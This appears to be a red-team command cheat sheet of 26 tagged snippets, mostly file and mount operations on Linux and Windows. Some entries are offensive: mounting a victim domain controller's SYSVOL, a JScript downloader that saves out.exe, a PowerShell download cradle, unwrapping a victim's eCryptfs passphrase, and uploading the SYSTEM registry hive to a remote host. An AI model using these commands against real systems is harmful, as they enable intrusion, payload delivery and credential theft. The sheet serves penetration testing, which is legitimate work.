### 1. 1Gig of zeros
```
dd if=/dev/zero of=1g.img count=1M bs=1K
```
**- linux,bash,files**
#### References:

https://www.cyberciti.biz/faq/linux-unix-dd-command-show-progress-while-coping/
__________
### 2. Fix nano <3 ;)
```
# rm -rf `which nano`; ln -s `which vim` /usr/bin/nano
```
**- bash,text manipulation,files,interesting**
#### References:

https://xkcd.com/378/
__________
### 3. Mount Sysvol share (hosted on the DC)
```
mount -t cifs \\\\[victim]\\SYSVOL -o username=[user],password=[password] mount/; nautilus mount/;
```
**- linux,files,smb,filesystem**
#### References:

https://www.cyberciti.biz/faq/linux-mount-cifs-windows-share/
__________
### 4. Windows open files
```
tasklist /FI "IMAGENAME eq [process].exe" /V
```
**- files,enumeration,Windows**
#### References:

https://technet.microsoft.com/en-gb/library/bb491010.aspx
__________
### 5. Javascript wget windows oneline : cscript /nologo wget.js http://[IP]
```
echo var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");WinHttpReq.Open("GET",WScript.Arguments(0), /*async=*/false);WinHttpReq.Send();BinStream = new ActiveXObject("ADODB.Stream");BinStream.Type=1;BinStream.Open();BinStream.Write(WinHttpReq.ResponseBody);BinStream.SaveToFile("out.exe");>wget.js
```
**- pivoting,files,Windows**
#### References:

http://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-is-doing
__________
### 6. Cat for windows
```
type [FILE]
```
**- files,Windows**
#### References:

https://www.microsoft.com/resources/documentation/windows/xp/all/proddocs/en-us/type.mspx?mfr=true
__________
### 7. Find files
```
find / -iname '[SEARCH TERM]' 2>/dev/null
```
**- linux,files**
#### References:

https://yg.ht
http://www.thegeekstuff.com/2009/03/15-practical-linux-find-command-examples
https://www.cyberciti.biz/tips/linux-findinglocating-files-with-find-command-part-1.html
__________
### 8. text in binaries
```
strings [FILENAME] --bytes=2 |grep "^sa$" -A 4
```
**- linux,bash,files**
#### References:

http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
__________
### 9. Encrypted zip
```
7z a -p -mem=AES report.zip [INPUT FILE]
```
**- linux,bash,files**
#### References:

https://yg.ht
https://www.cyberciti.biz/tips/how-can-i-zipping-and-unzipping-files-under-linux.html
__________
### 10. moount VDI disk image
```
modprobe nbd  max_part=16;  qemu-nbd -c /dev/nbd0 [File]; fdisk -l /dev/nbd0
```
**- linux,filesystem**
#### References:

https://necurity.co.uk/osprog/2016-04-09-mount-cheatsheat/
__________
### 11. Mount LVM filesytem / image
```
losetup /dev/loop0 [file]; kpartx -a /dev/loop0; vgscan; vgchange -ay changethishostname-vg; mount /dev/changethishostname-vg/root mnt/
```
**- linux,filesystem**
#### References:

https://necurity.co.uk/osprog/2016-04-09-mount-cheatsheat/
__________
### 12. Ecrypt FS mounting
```
printf "%s" $i | ecryptfs-unwrap-passphrase .ecryptfs/victim/.ecryptfs/wrapped-passphrase -; ecryptfs-add-passphrase -fnek; mount -t ecryptfs .ecryptfs/victim/.Private/ test/
```
**- linux,filesystem**
#### References:

https://necurity.co.uk/osprog/2016-04-09-mount-cheatsheat/
__________
### 13. Share a directory with the world, probably don't want the world
```
net share [sharename] [folder] /GRANT:Everyone,FULL
```
**- files,smb,Windows**
#### References:

https://technet.microsoft.com/en-us/library/bb490949.aspx
https://technet.microsoft.com/en-us/library/bb490712.aspx
__________
### 14. copy a remote file to lcwd
```
xcopy /s \\[victim] \dir [directory]
```
**- files,Windows**
#### References:

https://technet.microsoft.com/en-gb/library/bb491035.aspx
__________
### 15. download a file, no longer default
```
tftp -I [victim] GET [file]
```
**- files,Windows**
#### References:

https://technet.microsoft.com/en-gb/library/bb491014.aspx
__________
### 16. compress file
```
makecab [file]
```
**- files,Windows**
#### References:

https://technet.microsoft.com/en-us/library/hh875545(v=ws.11).aspx
__________
### 17. view logical shares
```
wmic logicaldisk get description,name
```
**- enumeration,Windows,filesystem**
#### References:

https://technet.microsoft.com/en-us/library/cc754534(v=ws.11).aspx
https://blogs.technet.microsoft.com/askperf/2012/02/17/useful-wmic-queries/
__________
### 18. powershell wget
```
invoke-webrequest
```
**- files,Windows,powershell**
#### References:

https://msdn.microsoft.com/powershell/reference/5.1/microsoft.powershell.utility/Invoke-WebRequest
__________
### 19. also powershell wget
```
wget
```
**- files,Windows,powershell**
#### References:

https://msdn.microsoft.com/powershell/reference/5.1/microsoft.powershell.utility/Invoke-WebRequest
__________
### 20. also powershell wget
```
(new-object system.net.webclient).downloadFile("[url]","[dest]")
```
**- files,Windows,powershell**
#### References:

https://msdn.microsoft.com/powershell/reference/5.1/microsoft.powershell.utility/Invoke-WebRequest
__________
### 21. powershell type file
```
get-content
```
**- files,Windows,powershell**
#### References:

https://msdn.microsoft.com/en-us/powershell/reference/5.0/microsoft.powershell.management/get-content
__________
### 22. powershell mount remote share : think sysinternals remote share
```
New-PSDrive -Persist -PSProvider FileSjstem -Root \\[ip]\tools -Name i
```
**- files,smb,Windows,powershell**
#### References:

https://msdn.microsoft.com/en-us/powershell/reference/5.1/microsoft.powershell.management/new-psdrive
__________
### 23. txt files changed after the 13 Jan 2017
```
Get-ChildItem -Path c:\ -Force -Recurse -Filter *.txt -ErrorAction SilentlyContinue | where {$_.LastWriteTime -gt "2017-01-13"}
```
**- files,Windows,powershell,forensics**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 24. Powershell upload file VIA post, script must write this out
```
powershell.exe -noprofile -noninteractive -command "[System.Net.ServicePointManager]::ServerCertificateValidationCallback{$true}$server="[$ip]/[script]";$filepath="c:/temp/SYSTEM";$http = new-object System.Net.Webclient; $response = $http.uploadFile($server,$filepath);"
```
**- networking,files,interesting,Windows,powershell**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 25. uninteractive FTP, read commands from file
```
ftp -s ftp.txt
```
**- files,interesting,Windows**
#### References:

https://technet.microsoft.com/en-gb/library/bb490910.aspx
__________
### 26. Mount a NFS share (check for root squash)
```
mount -t nfs 10.0.0.2:[/their/share] [/Mount/point] -o nolock
```
**- nfs,fileshare**
#### References:

https://www.centos.org/docs//4/4.5/Reference_Guide/s2-nfs-client-config-options.html
__________
